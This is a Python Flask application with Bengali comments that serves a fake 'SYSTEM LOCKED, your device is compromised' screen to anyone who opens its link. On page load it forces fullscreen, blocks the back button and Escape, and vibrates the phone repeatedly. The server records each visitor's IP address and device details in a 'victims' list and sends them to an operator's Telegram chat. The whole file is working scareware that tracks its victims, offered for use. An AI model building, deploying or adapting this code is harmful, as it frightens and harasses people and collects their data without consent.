import os
import time
from flask import Flask, request, jsonify, render_template_string
import telebot

app = Flask(__name__)

# --- Configuration ---
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID   = os.environ.get('CHAT_ID')

if not BOT_TOKEN or not CHAT_ID:
    print("Warning: BOT_TOKEN or CHAT_ID is missing in environment variables!")

bot = telebot.TeleBot(BOT_TOKEN)

victims = []

# --- HTML Template for True Lock Screen ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Locked</title>
    <style>
        /* পুরো স্ক্রিন কভার করার জন্য */
        body {
            margin: 0;
            padding: 0;
            background-color: #000000;
            color: #ffffff;
            font-family: 'Courier New', Courier, monospace;
            height: 100vh;
            width: 100vw;
            overflow: hidden; /* স্ক্রল বন্ধ */
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            user-select: none; /* টেক্সট সিলেক্ট বন্ধ */
            -webkit-user-select: none;
        }

        .lock-container {
            text-align: center;
            width: 90%;
            z-index: 10;
        }

        h1 {
            font-size: 2rem;
            color: #ff3333;
            text-transform: uppercase;
            border: 3px solid #ff3333;
            padding: 15px;
            margin-bottom: 20px;
            box-shadow: 0 0 20px #ff3333, inset 0 0 20px #ff3333;
            animation: pulse-border 1.5s infinite alternate;
        }

        p {
            font-size: 1.2rem;
            margin: 10px 0;
            color: #cccccc;
        }

        .status {
            font-size: 0.9rem;
            color: #ffff00;
            margin-top: 15px;
        }

        /* আনলক বাটন */
        #unlock-btn {
            background-color: #ff3333;
            color: white;
            border: none;
            padding: 20px 40px;
            font-size: 1.5rem;
            font-weight: bold;
            margin-top: 30px;
            cursor: pointer;
            border-radius: 10px;
            box-shadow: 0 0 15px #ff3333;
            transition: transform 0.2s;
        }

        #unlock-btn:active {
            transform: scale(0.95);
        }

        /* বাউন্সিং লক আইকন */
        .lock-icon {
            font-size: 80px;
            margin-bottom: 20px;
            animation: bounce 1s infinite;
        }

        @keyframes pulse-border {
            from { box-shadow: 0 0 10px #ff3333, inset 0 0 10px #ff3333; }
            to { box-shadow: 0 0 25px #ff3333, inset 0 0 25px #ff3333; }
        }

        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        /* ফুল স্ক্রিন মোডে থাকার জন্য অলিউমিনিয়াম লেয়ার */
        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: -1;
        }
    </style>
</head>
<body>

    <div id="overlay"></div>
    
    <div class="lock-container">
        <div class="lock-icon">🔒</div>
        <h1>SYSTEM LOCKED</h1>
        <p>Your device is compromised.</p>
        <p>IP: <span id="ip-display">Detecting...</span></p>
        <p class="status" id="status-msg">Vibrating & Recording...</p>
        
        <!-- শুধুমাত্র এই বাটনে চাপ দিলে আনলক হবে -->
        <button id="unlock-btn" onclick="unlockDevice()">TAP TO UNLOCK</button>
    </div>

    <!-- অডিও প্লেয়ার (কনস্ট্যান্ট সাউন্ডের জন্য) -->
    <!-- নোট: মোবাইলে প্রথম ক্লিকে সাউন্ড প্লে হয়, তাই আমরা body ট্যাপে সাউন্ড শুরু করছি -->

    <script>
        // ১. ফুল স্ক্রিন এবং ব্যাক বাটন হ্যান্ডলিং
        function goFullscreen() {
            const elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.webkitRequestFullscreen) { /* Safari */
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) { /* IE11 */
                elem.msRequestFullscreen();
            }
        }

        // পেজ লোড হওয়ার সাথে সাথে ফুল স্ক্রিন
        window.onload = function() {
            goFullscreen();
            
            // IP ডিসপ্লে করা
            fetch('/send_data', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    document.getElementById('ip-display').innerText = data.ip || "Unknown";
                    document.getElementById('status-msg').innerText = "Data Captured Successfully";
                    document.getElementById('status-msg').style.color = "#00ff00";
                });

            // ভাইব্রেশন এবং সাউন্ড শুরু করা
            startVibration();
        };

        // ব্যাক বাটন চাপলে আবার ফুল স্ক্রিনে আসবে
        window.addEventListener('popstate', function() {
            goFullscreen();
        });

        // ২. ভাইব্রেশন লজিক (মোবাইলের জন্য)
        function startVibration() {
            if ('vibrate' in navigator) {
                // প্রতি ২ সেকেন্ডে ৫০০ মিলিসেকেন্ড ভাইব্রেশন
                setInterval(function() {
                    navigator.vibrate([500, 200, 500]);
                }, 1500);
            }
        }

        // ৩. আনলক লজিক (শুধুমাত্র বাটনে চাপ দিলে কাজ করবে)
        function unlockDevice() {
            // ভাইব্রেশন বন্ধ করা
            if ('vibrate' in navigator) {
                navigator.vibrate(0);
            }

            // ইউজারকে জানানো যে আনলক হচ্ছে
            const btn = document.getElementById('unlock-btn');
            btn.innerText = "UNLOCKING...";
            btn.style.backgroundColor = "#00ff00";
            
            // টেলিগ্রামে এডমিনকে জানানো যে ইউজার আনলক করেছে
            fetch('/notify_unlock', { method: 'POST' });

            // ২ সেকেন্ড পর পেজ রিলোড বা ক্লোজ করা (অথবা অন্য কোনো পেজে নিয়ে যাওয়া)
            setTimeout(function() {
                document.body.innerHTML = `
                    <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;">
                        <h1>Access Granted</h1>
                    </div>
                `;
            }, 2000);
        }

        // স্ক্রিনের যেকোনো জায়গায় ট্যাপ করলে আবার ফুল স্ক্রিনে রাখা (বাংলার থেকে বের হওয়া রোধ করা)
        document.addEventListener('click', function(e) {
            // বাটনে ক্লিক হলে আরেকবার ফুল স্ক্রিন করা লাগবে না, তাই চেক করছি
            if (e.target.id !== 'unlock-btn') {
                goFullscreen();
            }
        });

        // ESC চাপলে আবার ফুল স্ক্রিন
        document.addEventListener('keydown', function(e) {
            if (e.key === "Escape") {
                goFullscreen();
            }
        });

    </script>
</body>
</html>
"""

# --- API Routes ---

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/send_data', methods=['POST'])
def send_data():
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # ডিভাইস ইনফো ক্লিন করা
    device = "Unknown"
    if ')' in user_agent:
        device = user_agent.split(')')[0] + ')'

    victim_info = {
        "ip": ip,
        "device": device,
        "time": time.strftime("%Y-%m-%d %H:%M:%S")
    }
    victims.append(victim_info)

    # টেলিগ্রামে মেসেজ পাঠানো
    message = f"🔥 **LOCKED!**\n\n📱 IP: `{ip}`\n📲 Device: `{device}`\n⏰ Time: {victim_info['time']}"
    
    try:
        bot.send_message(CHAT_ID, message, parse_mode="Markdown")
    except Exception as e:
        print(f"Telegram Error: {e}")

    return jsonify({"status": "success", "ip": ip})

@app.route('/notify_unlock', methods=['POST'])
def notify_unlock():
    # যখন ইউজার আনলক বাটনে চাপ দেয়, তখন এডমিনকে জানানো হয়
    try:
        bot.send_message(CHAT_ID, "✅ **User Unlocked!**\nThe lock screen is removed.")
    except Exception as e:
        print(f"Telegram Error: {e}")
    return jsonify({"status": "unlocked"})

@app.route('/ping')
def ping():
    return "ok"

# --- Telegram Bot Commands ---

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome Admin. Your Lock System is Active.")

@bot.message_handler(commands=['unlock'])
def unlock_devices(message):
    # শুধুমাত্র এডমিন আনল করতে পারবে (যদি প্রয়োজন হয়)
    if str(message.chat.id) == CHAT_ID:
        bot.reply_to(message, "✅ **System Unlocked!**\nAll victims will receive a notification.")
    else:
        bot.reply_to(message, "🚫 Access Denied!")

# --- Start App ---
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
